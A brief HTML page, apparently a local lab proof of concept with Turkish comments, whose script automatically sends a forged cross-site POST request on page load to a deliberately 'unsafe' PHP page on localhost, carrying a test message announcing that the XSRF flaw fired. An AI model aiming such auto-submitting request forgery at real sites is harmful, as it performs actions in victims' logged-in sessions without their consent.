<!DOCTYPE html>

    <title>XSRF Example</title>
</head>
<body>
<script>
    // POST isteği göndermek için XMLHttpRequest kullanıyoruz
    var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://localhost/proje/unsafe/index.php", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

        // Gönderilecek veriler
        var data = "_POST=" + encodeURIComponent("Şuan xsrf açığı tetiklendi test1235");

        // İstek gönderme
        xhr.send(data);
</script>
</body>
